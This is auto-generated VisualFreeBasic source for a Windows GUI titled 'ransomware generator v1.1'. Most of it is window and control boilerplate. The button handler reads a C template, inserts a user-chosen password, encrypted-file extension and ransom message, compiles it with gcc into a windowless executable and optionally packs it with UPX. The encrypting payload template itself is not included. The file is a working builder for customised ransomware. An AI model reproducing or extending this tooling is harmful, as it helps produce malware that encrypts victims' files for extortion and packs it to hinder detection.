'[FILE:C:\mlgb\VFB\Projects\makevirus\forms\Form1.frm|617]
'-----------------------------------------------------------------------------
' 由 VisualFreeBasic 5.2.8 生成的源代码
' 生成时间：2020年05月11日 09时00分40秒
' 更多信息请访问 www.yfvb.com 
'-----------------------------------------------------------------------------

'------------------------------------------------------------------------------
'VisualFreeBasic 自动生成的 mv 函数
'------------------------------------------------------------------------------

Function mv_Class_Form.Show(hWndParent As.hWnd = HWND_DESKTOP, Modal As Boolean = False, UserData As Integer = 0) As .hWnd	 '加载窗口并且显示, 模态显示用True {2.True.False} UserData 是传递给创建事件的参数，不保存数值
   If This.Repeat = False Then 
      If IsWindow(This.hWnd) Then 
         This.FlashWindow
         Return This.hWnd
      End if 
   End if    
   Dim pWindow AS CWindow Ptr = New CWindow("makevirus_mv")
   '创建一个窗口
   hWnd = pWindow->Create(hWndParent, "勒索病毒生成器 v1.1 [2020年母亲节快乐 ：-]", Cast(WNDPROC, @mv_FORMPROCEDURE), 0, 0, 523, 232, WS_THICKFRAME Or WS_CAPTION Or WS_SYSMENU Or WS_MINIMIZEBOX Or WS_MAXIMIZEBOX Or WS_CLIPSIBLINGS Or WS_CLIPCHILDREN Or WS_POPUP Or WS_SIZEBOX, WS_EX_WINDOWEDGE Or WS_EX_CONTROLPARENT Or WS_EX_LEFT Or WS_EX_LTRREADING Or WS_EX_RIGHTSCROLLBAR)
   If IsWindow(hWnd) = 0 Then
      Delete pWindow
      Return 0
   End if
   Dim fp As FormControlsPro_TYPE ptr = new FormControlsPro_TYPE
   SetPropW(hWnd, "FCP_TYPE_PTR", Cast(Any Ptr, fp))
   DIm rcParent AS RECT  '为控件布局属性，初始化数据用
   .GetClientRect(hWnd, @rcParent)
   rcParent.Right = AfxUnscaleX(rcParent.Right)  ' 为自动响应DPI，全部调整为 100%DPI 时的数值
   rcParent.Bottom = AfxUnscaleX(rcParent.Bottom) 
   fp->hWndParent = hWndParent
   fp->nName = "mv"
   
   '给窗口设置其它参数
   pWindow->ClassStyle = CS_VREDRAW Or CS_HREDRAW Or CS_DBLCLKS
   '图标
   fp->BigIcon = NULL
   fp->SmallIcon = NULL
   pWindow->BigIcon = fp->BigIcon     '需要在销毁窗口时销毁句柄
   pWindow->SmallIcon = fp->SmallIcon
'   This.Constructor '初始化窗口类
   '菜单
   '启动位置
   pWindow->Center
   '鼠标穿透 透明度 透明颜色
   
   
   This.TransColor =  &H197F7F7F
   This.MousePointer = 0
   This.BackColor = &H0F7F7F7F
   
   
   
   '创建所有的子控件
   Dim hWndControl As .hWnd '控件句柄
   
   hWndControl = pWindow->AddControl("CHECKBOX", hWnd, 101, "O3优化", 31, 90, 83, 27,WS_CHILD Or WS_CLIPCHILDREN Or WS_CLIPSIBLINGS Or BS_AUTOCHECKBOX Or BS_TEXT Or BS_NOTIFY Or BS_LEFT Or BS_VCENTER Or BS_MULTILINE Or WS_VISIBLE Or WS_TABSTOP ,0 , , Cast(Any Ptr, @mv_CODEPROCEDURE))
   If hWndControl Then 
      Dim fp As FormControlsPro_TYPE ptr = new FormControlsPro_TYPE
      SetPropW(hWndControl, "FCP_TYPE_PTR", Cast(Any Ptr, fp))
      fp->hWndParent = hWnd
      fp->Index = -1
      fp->IDC = 101
      fp->nText = "O3优化"
      fp->ControlType = 0
      This.Check1.hWnd = hWndControl 
      This.Check1.IDC =101
      fp->nName = "Check1"
      This.Check1.Caption = "O3优化"
      This.Check1.ForeColor = &H087F7F7F
      This.Check1.BackColor = &H197F7F7F
      This.Check1.Font = "Tahoma,9,0"
      fp->nLeft = 31
      fp->nTop = 90
      fp->nWidth = 83
      fp->nHeight = 27
   End IF

   hWndControl = pWindow->AddControl("TEXTBOX", hWnd, 102, "", 28, 26, 484, 22,WS_CHILD Or ES_LEFT Or ES_AUTOHSCROLL Or WS_VISIBLE Or WS_TABSTOP ,WS_EX_CLIENTEDGE , , Cast(Any Ptr, @mv_CODEPROCEDURE))
   If hWndControl Then 
      Dim fp As FormControlsPro_TYPE ptr = new FormControlsPro_TYPE
      SetPropW(hWndControl, "FCP_TYPE_PTR", Cast(Any Ptr, fp))
      fp->hWndParent = hWnd
      fp->Index = -1
      fp->IDC = 102
      fp->nText = ""
      fp->ControlType = 1
      This.Text1.hWnd = hWndControl 
      This.Text1.IDC =102
      fp->nName = "Text1"
      This.Text1.ForeColor = &H087F7F7F
      This.Text1.BackColor = &H057F7F7F
      This.Text1.Font = "Tahoma,9,0"
      fp->nLeft = 28
      fp->nTop = 26
      fp->nWidth = 484
      fp->nHeight = 22
   End IF

   hWndControl = pWindow->AddControl("TEXTBOX", hWnd, 103, "", 27, 56, 84, 24,WS_CHILD Or ES_LEFT Or ES_AUTOHSCROLL Or WS_VISIBLE Or WS_TABSTOP ,WS_EX_CLIENTEDGE , , Cast(Any Ptr, @mv_CODEPROCEDURE))
   If hWndControl Then 
      Dim fp As FormControlsPro_TYPE ptr = new FormControlsPro_TYPE
      SetPropW(hWndControl, "FCP_TYPE_PTR", Cast(Any Ptr, fp))
      fp->hWndParent = hWnd
      fp->Index = -1
      fp->IDC = 103
      fp->nText = ""
      fp->ControlType = 1
      This.Text2.hWnd = hWndControl 
      This.Text2.IDC =103
      fp->nName = "Text2"
      This.Text2.ForeColor = &H087F7F7F
      This.Text2.BackColor = &H057F7F7F
      This.Text2.Font = "Tahoma,9,0"
      fp->nLeft = 27
      fp->nTop = 56
      fp->nWidth = 84
      fp->nHeight = 24
   End IF

   hWndControl = pWindow->AddControl("TEXTBOX", hWnd, 104, "xbck", 202, 58, 312, 23,WS_CHILD Or ES_LEFT Or ES_AUTOHSCROLL Or WS_VISIBLE Or WS_TABSTOP ,WS_EX_CLIENTEDGE , , Cast(Any Ptr, @mv_CODEPROCEDURE))
   If hWndControl Then 
      Dim fp As FormControlsPro_TYPE ptr = new FormControlsPro_TYPE
      SetPropW(hWndControl, "FCP_TYPE_PTR", Cast(Any Ptr, fp))
      fp->hWndParent = hWnd
      fp->Index = -1
      fp->IDC = 104
      fp->nText = "xbck"
      fp->ControlType = 1
      This.Text3.hWnd = hWndControl 
      This.Text3.IDC =104
      fp->nName = "Text3"
      This.Text3.Text = "xbck"
      This.Text3.ForeColor = &H087F7F7F
      This.Text3.BackColor = &H057F7F7F
      This.Text3.Font = "Tahoma,9,0"
      fp->nLeft = 202
      fp->nTop = 58
      fp->nWidth = 312
      fp->nHeight = 23
   End IF

   hWndControl = pWindow->AddControl("CHECKBOX", hWnd, 105, "upx压缩", 31, 124, 70, 25,WS_CHILD Or WS_CLIPCHILDREN Or WS_CLIPSIBLINGS Or BS_AUTOCHECKBOX Or BS_TEXT Or BS_NOTIFY Or BS_LEFT Or BS_VCENTER Or BS_MULTILINE Or WS_VISIBLE Or WS_TABSTOP ,0 , , Cast(Any Ptr, @mv_CODEPROCEDURE))
   If hWndControl Then 
      Dim fp As FormControlsPro_TYPE ptr = new FormControlsPro_TYPE
      SetPropW(hWndControl, "FCP_TYPE_PTR", Cast(Any Ptr, fp))
      fp->hWndParent = hWnd
      fp->Index = -1
      fp->IDC = 105
      fp->nText = "upx压缩"
      fp->ControlType = 0
      This.Check2.hWnd = hWndControl 
      This.Check2.IDC =105
      fp->nName = "Check2"
      This.Check2.Caption = "upx压缩"
      This.Check2.ForeColor = &H087F7F7F
      This.Check2.BackColor = &H197F7F7F
      This.Check2.Font = "Tahoma,9,0"
      fp->nLeft = 31
      fp->nTop = 124
      fp->nWidth = 70
      fp->nHeight = 25
   End IF

   fp->VrControls = new FormControlsPro_TYPE '创建虚拟控件链表
   fp = fp->VrControls
   If fp Then 
      This.Label1.hWndForm = hWnd 
      fp->hWndParent = hWnd
      fp->Index = -1
      fp->IDC = 106
      fp->nText = "gcc编译器路径（gcc.exe）"
      fp->ControlType = 100
      This.Label1.IDC =106
      fp->Style = (fp->Style And &H00FFFFFF) Or (Cast(UInteger,0) Shl 24)
      fp->Style = (fp->Style And &HFF00FFFF) Or (Cast(UInteger,0) Shl 16)
      fp->Style Or= &H4 
      fp->Style And= Not &H8 
      fp->nName = "Label1"
      This.Label1.Caption = "gcc编译器路径（gcc.exe）"
      fp->Style Or= &H1 
      fp->Style Or= &H2 
      This.Label1.ForeColor = &H087F7F7F
      This.Label1.BackColor = &H197F7F7F
      This.Label1.Font = "Tahoma,9,0"
      fp->nLeft = 31
      fp->nTop = 7
      fp->nWidth = 154
      fp->nHeight = 20
   End IF

   fp->VrControls = new FormControlsPro_TYPE '创建虚拟控件链表
   fp = fp->VrControls
   If fp Then 
      This.Label2.hWndForm = hWnd 
      fp->hWndParent = hWnd
      fp->Index = -1
      fp->IDC = 107
      fp->nText = "密码"
      fp->ControlType = 100
      This.Label2.IDC =107
      fp->Style = (fp->Style And &H00FFFFFF) Or (Cast(UInteger,0) Shl 24)
      fp->Style = (fp->Style And &HFF00FFFF) Or (Cast(UInteger,0) Shl 16)
      fp->Style Or= &H4 
      fp->Style And= Not &H8 
      fp->nName = "Label2"
      This.Label2.Caption = "密码"
      fp->Style Or= &H1 
      fp->Style Or= &H2 
      This.Label2.ForeColor = &H087F7F7F
      This.Label2.BackColor = &H197F7F7F
      This.Label2.Font = "Tahoma,9,0"
      fp->nLeft = 1
      fp->nTop = 61
      fp->nWidth = 28
      fp->nHeight = 26
   End IF

   fp->VrControls = new FormControlsPro_TYPE '创建虚拟控件链表
   fp = fp->VrControls
   If fp Then 
      This.Label3.hWndForm = hWnd 
      fp->hWndParent = hWnd
      fp->Index = -1
      fp->IDC = 108
      fp->nText = "加密后缀名"
      fp->ControlType = 100
      This.Label3.IDC =108
      fp->Style = (fp->Style And &H00FFFFFF) Or (Cast(UInteger,0) Shl 24)
      fp->Style = (fp->Style And &HFF00FFFF) Or (Cast(UInteger,0) Shl 16)
      fp->Style Or= &H4 
      fp->Style And= Not &H8 
      fp->nName = "Label3"
      This.Label3.Caption = "加密后缀名"
      fp->Style Or= &H1 
      fp->Style Or= &H2 
      This.Label3.ForeColor = &H087F7F7F
      This.Label3.BackColor = &H197F7F7F
      This.Label3.Font = "Tahoma,9,0"
      fp->nLeft = 114
      fp->nTop = 60
      fp->nWidth = 99
      fp->nHeight = 22
   End IF

   hWndControl = pWindow->AddControl("TEXTBOX", hWnd, 109, "加密完成后的提示信息", 123, 90, 391, 22,WS_CHILD Or ES_LEFT Or ES_AUTOHSCROLL Or WS_VISIBLE Or WS_TABSTOP ,WS_EX_CLIENTEDGE , , Cast(Any Ptr, @mv_CODEPROCEDURE))
   If hWndControl Then 
      Dim fp As FormControlsPro_TYPE ptr = new FormControlsPro_TYPE
      SetPropW(hWndControl, "FCP_TYPE_PTR", Cast(Any Ptr, fp))
      fp->hWndParent = hWnd
      fp->Index = -1
      fp->IDC = 109
      fp->nText = "加密完成后的提示信息"
      fp->ControlType = 1
      This.Text4.hWnd = hWndControl 
      This.Text4.IDC =109
      fp->nName = "Text4"
      This.Text4.Text = "加密完成后的提示信息"
      This.Text4.ForeColor = &H087F7F7F
      This.Text4.BackColor = &H057F7F7F
      This.Text4.Font = "Tahoma,9,0"
      fp->nLeft = 123
      fp->nTop = 90
      fp->nWidth = 391
      fp->nHeight = 22
   End IF

   hWndControl = pWindow->AddControl("BUTTON", hWnd, 110, "开始生成", 123, 122, 387, 43,WS_CHILD Or BS_PUSHBUTTON Or BS_CENTER Or BS_VCENTER Or SS_NOTIFY Or WS_VISIBLE Or WS_TABSTOP ,0 , , Cast(Any Ptr, @mv_CODEPROCEDURE))
   If hWndControl Then 
      Dim fp As FormControlsPro_TYPE ptr = new FormControlsPro_TYPE
      SetPropW(hWndControl, "FCP_TYPE_PTR", Cast(Any Ptr, fp))
      fp->hWndParent = hWnd
      fp->Index = -1
      fp->IDC = 110
      fp->nText = "开始生成"
      fp->ControlType = 2
      This.Command1.hWnd = hWndControl 
      This.Command1.IDC =110
      fp->nName = "Command1"
      This.Command1.Caption = "开始生成"
      This.Command1.Font = "Tahoma,9,0"
      fp->nLeft = 123
      fp->nTop = 122
      fp->nWidth = 387
      fp->nHeight = 43
   End IF

   hWndControl = pWindow->AddControl("TEXTBOX", hWnd, 111, "生成病毒的路径", 30, 167, 486, 36,WS_CHILD Or ES_LEFT Or ES_AUTOHSCROLL Or WS_VISIBLE Or WS_TABSTOP ,WS_EX_CLIENTEDGE , , Cast(Any Ptr, @mv_CODEPROCEDURE))
   If hWndControl Then 
      Dim fp As FormControlsPro_TYPE ptr = new FormControlsPro_TYPE
      SetPropW(hWndControl, "FCP_TYPE_PTR", Cast(Any Ptr, fp))
      fp->hWndParent = hWnd
      fp->Index = -1
      fp->IDC = 111
      fp->nText = "生成病毒的路径"
      fp->ControlType = 1
      This.Text5.hWnd = hWndControl 
      This.Text5.IDC =111
      fp->nName = "Text5"
      This.Text5.Text = "生成病毒的路径"
      This.Text5.ForeColor = &H087F7F7F
      This.Text5.BackColor = &H057F7F7F
      This.Text5.Font = "Tahoma,9,0"
      fp->nLeft = 30
      fp->nTop = 167
      fp->nWidth = 486
      fp->nHeight = 36
   End IF

   hWndControl = pWindow->AddControl("OPTION", hWnd, 112, "RC4加密", 198, 4, 76, 15,WS_CHILD Or WS_CLIPCHILDREN Or WS_CLIPSIBLINGS Or BS_AUTORADIOBUTTON Or BS_TEXT Or BS_NOTIFY Or BS_LEFT Or BS_VCENTER Or BS_MULTILINE Or WS_GROUP Or WS_DISABLED Or WS_VISIBLE Or WS_TABSTOP ,0 , , Cast(Any Ptr, @mv_CODEPROCEDURE))
   If hWndControl Then 
      Dim fp As FormControlsPro_TYPE ptr = new FormControlsPro_TYPE
      SetPropW(hWndControl, "FCP_TYPE_PTR", Cast(Any Ptr, fp))
      fp->hWndParent = hWnd
      fp->Index = -1
      fp->IDC = 112
      fp->nText = "RC4加密"
      fp->ControlType = 0
      This.Option1.hWnd = hWndControl 
      This.Option1.IDC =112
      fp->nName = "Option1"
      This.Option1.Caption = "RC4加密"
      This.Option1.ForeColor = &H087F7F7F
      This.Option1.BackColor = &H197F7F7F
      This.Option1.Font = "Tahoma,9,0"
      fp->nLeft = 198
      fp->nTop = 4
      fp->nWidth = 76
      fp->nHeight = 15
      This.Option1.ToolTip = "加密速度较快，安全性高"
   End IF

   hWndControl = pWindow->AddControl("OPTION", hWnd, 113, "Xor加密", 296, 3, 89, 18,WS_CHILD Or WS_CLIPCHILDREN Or WS_CLIPSIBLINGS Or BS_AUTORADIOBUTTON Or BS_TEXT Or BS_NOTIFY Or BS_LEFT Or BS_VCENTER Or BS_MULTILINE Or WS_VISIBLE Or WS_TABSTOP ,0 , , Cast(Any Ptr, @mv_CODEPROCEDURE))
   If hWndControl Then 
      Dim fp As FormControlsPro_TYPE ptr = new FormControlsPro_TYPE
      SetPropW(hWndControl, "FCP_TYPE_PTR", Cast(Any Ptr, fp))
      fp->hWndParent = hWnd
      fp->Index = -1
      fp->IDC = 113
      fp->nText = "Xor加密"
      fp->ControlType = 0
      This.Option2.hWnd = hWndControl 
      This.Option2.IDC =113
      fp->nName = "Option2"
      This.Option2.Caption = "Xor加密"
      This.Option2.ForeColor = &H087F7F7F
      This.Option2.BackColor = &H197F7F7F
      This.Option2.Font = "Tahoma,9,0"
      fp->nLeft = 296
      fp->nTop = 3
      fp->nWidth = 89
      fp->nHeight = 18
      This.Option2.ToolTip = "加密速度极快，安全性较低，容易被破解"
   End IF

    MV_WM_CREATE(hWnd ,UserData )  '[FILE:C:\mlgb\VFB\Projects\makevirus\forms\Form1.frm|53]
   PostMessage(hWnd, &H1000, &H1000,CAst(lPArAm,UsErDAtA)) '显示事件
   '将焦点设置为选项卡顺序中的最低控件
   hWndControl = hWnd '设置焦点后会发生消息循环的情况，要是同时多开同一个窗口，就发生 hWnd 被赋值为下一个窗口句柄的情况。
      This.Check1.SetFocus

   Function = FLY_DoMessagePump(pWindow,Modal, hWndControl, hWndParent, SW_SHOWNORMAL, False) ' IsMDIForm 如果这是MDI窗口，请设置标志
End Function

Function mv_FORMPROCEDURE(ByVal hWndForm As HWND, ByVal wMsg As uInteger, ByVal wParam As WPARAM, ByVal lParam As LPARAM) As LResult 'mv 窗口回调过程
   Dim tLResult As LResult
   Select Case wMsg
      Case WM_SIZE
         If wParam <> SIZE_MINIMIZED Then
            '状态栏调整大小
            
            '控件布局调整大小
            FLY_VFB_Layout_hWndForm(hWndForm)
         End If
      Case WM_PAINT '处理虚拟控件
         Dim fp As FormControlsPro_TYPE ptr = GetPropW(hWndForm, "FCP_TYPE_PTR")
         if fp Then
            Dim WinCc As Long = GetCodeColorGDI(fp->BackColor)
            If WinCc = -1 Then WinCc = GetSysColor(COLOR_BTNFACE)
            Dim gg As yGDI = yGDI(hWndForm, WinCc, True)
            
            '描绘虚拟控件
            
            mv.Label3.hWndForm = hWndForm 
            mv.Label3.Drawing(gg,hWndForm,WinCc)  
            mv.Label2.hWndForm = hWndForm 
            mv.Label2.Drawing(gg,hWndForm,WinCc)  
            mv.Label1.hWndForm = hWndForm 
            mv.Label1.Drawing(gg,hWndForm,WinCc)  
            
         end if
   End Select
   '以下CASE从表单上的控件以及用户自己处理的任何这些消息中调用通知事件。
   Select Case wMsg
      Case &H1000
         if wParam = &H1000 then
            Dim rc as Rect   '由于控件创建时间比尺寸消息晚，需要重新触发一次
            GetClientRect(hWndForm, @rc)
            SendMessage(hWndForm, WM_SIZE, SIZE_RESTORED, MAKELPARAM(rc.Right - rc.Left, rc.Bottom - rc.Top))
            
            InvalidateRect(hWndForm, Null, True)
            UpdateWindow(hWndForm)
            Return 0
         End If
      Case WM_COMMAND
         
         Dim As Long IDC =LoWord(wParam) ,CODE = HiWord(wParam)
          If IDC = 110 And CODE = BN_CLICKED Then  ' Command1
              MV_COMMAND1_BN_CLICKED(hWndForm, Cast(HWND, lParam))  '[FILE:C:\mlgb\VFB\Projects\makevirus\forms\Form1.frm|4]
           End If

      Case WM_HSCROLL
         

      Case WM_VSCROLL
         

         
         
         
         
         
         
         
         
         
         
         
         
         
         
         
         
         
         
      Case WM_NOTIFY
         Dim FLY_pNotify As NMHDR Ptr = Cast(NMHDR Ptr, lParam)
         
         
   End Select
   '处理虚拟控件事件
   

   '处理任何自定义消息。
   
   '以下CASE处理VisualFreeBasic内部要求
   Select Case wMsg
      Case WM_GETMINMAXINFO
         '不要为MDI子窗体处理此消息，因为它会干扰子窗体的最大化。
         If (GetWindowLongPtr(hWndForm, GWL_EXSTYLE) And WS_EX_MDICHILD) <> WS_EX_MDICHILD Then
            DefWindowProcW(hWndForm, wMsg, wParam, lParam)
            Dim FLY_pMinMaxInfo As MINMAXINFO Ptr = Cast(MINMAXINFO Ptr, lParam)
            
            
            
            
            Return 0
            End If	
         Case WM_SYSCOMMAND
            If (wParam And &HFFF0) = SC_CLOSE Then
               SendMessage hWndForm, WM_CLOSE, wParam, lParam
               Exit Function
            End If
         Case WM_SETFOCUS
            '将焦点设置回正确的子控件。
            'If ff Then SetFocus ff->CtrlFocus
         Case WM_SYSCOLORCHANGE, WM_THEMECHANGED '当对系统颜色设置进行更改, 在主题更改事件之后广播到每个窗口。
            '为窗体上的控件重新创建任何背景画笔。
            '将此消息转发给任何通用控件，因为它们不会自动接收此消息。
            Dim fp As FormControlsPro_TYPE ptr = GetPropW(hWndForm, "FCP_TYPE_PTR")
            If fp then
               Dim cc as Long = GetCodeColorGDI(fp->BackColor)
               if cc = -1 then cc = GetSysColor(COLOR_BTNFACE)
               If fp->hBackBrush Then DeleteBrush(fp->hBackBrush)
               fp->hBackBrush = CreateSolidBrush(cc)
               dim zhWnd as HWND = GetWindow(hWndForm, GW_CHILD)
               While zhWnd
                  dim zfp As FormControlsPro_TYPE ptr = GetPropW(zhWnd, "FCP_TYPE_PTR")
                  Dim zcc as Long = GetCodeColorGDI(zfp->BackColor)
                  if zcc = -1 then zcc = cc
                  If zfp->hBackBrush Then DeleteBrush(zfp->hBackBrush)
                  zfp->hBackBrush = CreateSolidBrush(zcc)
                  zhWnd = GetWindow(zhWnd, GW_HWNDNEXT)
               Wend 
            End If
            
         Case WM_NOTIFY
            '{TOOLBAR_NOTIFY}
         Case WM_SETCURSOR
            dim a as long = LOWORD(lParam)
            if a = 1 then '位于客户区
               Dim fp As FormControlsPro_TYPE ptr = GetPropW(cast(hwnd, wParam), "FCP_TYPE_PTR")
               if fp Then
                  if fp->nCursor then
                     SetCursor(fp->nCursor)
                     Return True
                  end if
               end if
            end if
         Case WM_PAINT
            Return True  '采用自绘，需要立即返回
         Case WM_ERASEBKGND ' 采用自绘，不需要系统画背景
            Return True   '防止擦除背景，不加这个会闪的。
         Case WM_DESTROY
            
            '通知每个控件类（包括虚拟控件），做必要的卸载工作，因为窗口类是全局的，不会因为窗口销毁而销毁。
            mv.hWndForm = hWndForm 
            mv.Destructor 
            mv.Check1.hWndForm = hWndForm
            mv.Check1.Destructor
            mv.Text1.hWndForm = hWndForm
            mv.Text1.Destructor
            mv.Text2.hWndForm = hWndForm
            mv.Text2.Destructor
            mv.Text3.hWndForm = hWndForm
            mv.Text3.Destructor
            mv.Check2.hWndForm = hWndForm
            mv.Check2.Destructor
            mv.Label1.hWndForm = hWndForm
            mv.Label1.Destructor
            mv.Label2.hWndForm = hWndForm
            mv.Label2.Destructor
            mv.Label3.hWndForm = hWndForm
            mv.Label3.Destructor
            mv.Text4.hWndForm = hWndForm
            mv.Text4.Destructor
            mv.Command1.hWndForm = hWndForm
            mv.Command1.Destructor
            mv.Text5.hWndForm = hWndForm
            mv.Text5.Destructor
            mv.Option1.hWndForm = hWndForm
            mv.Option1.Destructor
            mv.Option2.hWndForm = hWndForm
            mv.Option2.Destructor

            '删除任何用户定义的Timer控件
            
            
            mv.hWnd = 0
            Dim pWindow AS CWindow Ptr = AfxCWindowPtr(hWndForm)
            If pWindow Then Delete pWindow
            Dim fp As FormControlsPro_TYPE ptr = GetPropW(hWndForm, "FCP_TYPE_PTR")
            While fp   '清理虚拟控件
               if fp->BigIcon then DestroyIcon fp->BigIcon
               if fp->SmallIcon then DestroyIcon fp->SmallIcon
               if fp->hBackBrush then DeleteBrush(fp->hBackBrush)
               If fp->ToolWnd Then DestroyWindow fp->ToolWnd
               if fp->nCursor then DestroyCursor fp->nCursor    
               Dim sfp As FormControlsPro_TYPE ptr = fp->VrControls
               Delete fp
               fp = sfp
            Wend 
            RemovePropW hWndForm, "FCP_TYPE_PTR"
            
         Case WM_CTLCOLOREDIT, WM_CTLCOLORLISTBOX, WM_CTLCOLORSTATIC, WM_CTLCOLORBTN
            '从子控件收到的消息即将显示。在此处设置颜色属性。lParam是Control的句柄。 wParam是hDC。
            Dim fp As FormControlsPro_TYPE ptr = GetPropW(Cast(HWND, lParam), "FCP_TYPE_PTR")
            If fp then
               Dim cc as Long = GetCodeColorGDI(fp->ForeColor)
               if cc <> -1 then SetTextColor(Cast(hDC, wParam), cc)
               cc = GetCodeColorGDI(fp->BackColor)
               if cc = -1 Then
                  Dim wfp As FormControlsPro_TYPE ptr = GetPropW(hWndForm, "FCP_TYPE_PTR")
                  if wfp = 0 then exit select
                  cc = GetCodeColorGDI(wfp->BackColor)
               End If
               if cc = -1 then cc = GetSysColor(COLOR_BTNFACE)
               SetBkColor(Cast(hDC, wParam), cc)
               If fp->hBackBrush = 0 Then fp->hBackBrush = CreateSolidBrush(cc)
               Return Cast(LRESULT, fp->hBackBrush)
            End If
      End Select
      Function = DefWindowProcW(hWndForm, wMsg, wParam, lParam)
   End Function

Function mv_CODEPROCEDURE(ByVal hWndControl As HWND, ByVal wMsg As uInteger, ByVal wParam As WPARAM, ByVal lParam As LPARAM) As LRESULT  ' mv 控件回调
   'mv 窗口上每个控件的所有消息都在此函数中处理。
   Dim fp As FormControlsPro_TYPE ptr = GetPropW(hWndControl, "FCP_TYPE_PTR")
   Dim tLResult As LResult
   '以下CASE在处理用户定义事件之前处理内部VisualFreeBasic要求（这些事件在此之后的单独CASE中处理）。
   Select Case wMsg
      Case WM_DESTROY
         
         
      Case WM_NCHITTEST  '启用鼠标出窗口检查
 
         
   End Select
   
   
   '以下情况调用每个用户定义的函数。
   Select Case wMsg

      Case 0
         
   End Select
   
   '如有必要，处理任何自定义消息。
   
   
   if wMsg=WM_DESTROY then 
      '// 需要：删除控件子类
      SetWindowLongPtrW hWndControl, GWLP_WNDPROC, CAST(LONG_PTR, RemovePropW(hWndControl, "OLDWNDPROC"))
      If fp Then
         if fp->hBackBrush then DeleteBrush(fp->hBackBrush)
         If fp->ToolWnd Then DestroyWindow fp->ToolWnd
         if fp->nCursor then DestroyCursor fp->nCursor
         Delete fp
      End If
      RemovePropW hWndControl, "FCP_TYPE_PTR"      
      
   End If
   '此控件是子类，因此我们必须将所有未处理的消息发送到原始窗口过程。
   FUNCTION = CallWindowProcW(GetPropW(hWndControl, "OLDWNDPROC"), hWndControl, wMsg, wParam, lParam)
   
End Function
'优化是标准的工程模版，你也可做自己的模版。
'写好工程，复制全部文件到VFB软件文件夹里【template】里即可，子文件夹名为 VFB新建工程里显示的名称
'快去打造属于你自己的工程模版吧。

Sub mv_Command1_BN_Clicked(hWndForm As hWnd, hWndControl As hWnd)  '单击
   if Dir(App.Path + "\\bin\\upx.exe") = "" then
      MessageBox NULL, "无压缩器！！！", "error", 16
      exit sub
   End if
   if Dir(App.Path + "\\bin\\1.c") = "" then
      MessageBox NULL, "无 1.c ", "error", 16
      exit sub
   End if
   if len(mv.Text1.text) = 0 then
      MessageBox NULL, "编译器不存在！！！", "error", 16
      exit sub
   End if
   Dim _data As String
   Dim buffer As String
   
   if mv.Option1.Value = True then
      Open App.Path + "\\bin\\1.C" For Input As #1
   Else
        Open App.Path + "\\bin\\1.C" For Input As #1
   End if
   Do While Not EOF(1)
      Line Input #1, buffer
      _data = _data + buffer + vbcrlf
   Loop
   Close #1
   _data = ReplaceASM(ReplaceASM(ReplaceASM(ReplaceASM( _data, ",4)", "," + str(len(mv.Text3.text)) + ")"), "CX+*FBHSF+/HBSF", mv.Text2.text), "宁的电脑被黑了（手动滑稽）", mv.Text4.text), "bck2", mv.Text3.text)
   if len(Dir(Environ("temp") + "\\6.c")) <> 0 then
      DeleteFileA Environ("temp") + "\\6.c"
   End if
   open Environ("temp") + "\\6.c" for output as #1
   print #1, _data
   close #1
   Dim a as string
   if mv.Check1.Value = true Then
      a = " -O3"
   Else
      a = " -O1"
   End if
   Shell mv.Text1.Text + " " + A + " -std=gnu99 -mwindows """ + Environ("temp") +"\"+ "6.c"" " + "-o " + """" + mv.Text5.TEXT + """"
   Dim t As String = mv.Text5.text
   mv.Text5.Text = mv.Text1.Text + " " + A + " -std=gnu99 -mwindows """ + Environ("temp") + "\"+"6.c"" " + "-o " + """" + mv.Text5.TEXT + """"
   if mv.Check2.Value = true Then
      Sleep 3500
      Shell App.Path + "\\bin\\upx.exe " + """" + t + """"
      mv.Text5.Text = App.Path + "\\bin\\upx.exe " + """" + t + """"
   End if
End Sub

Sub mv_WM_Create(hWndForm As hWnd,UserData As Integer)  '完成创建窗口及所有的控件后，此时窗口还未显示。注：自定义消息里 WM_Create 此时还未创建控件和初始赋值。
mv.Option2.Value=True
End Sub






















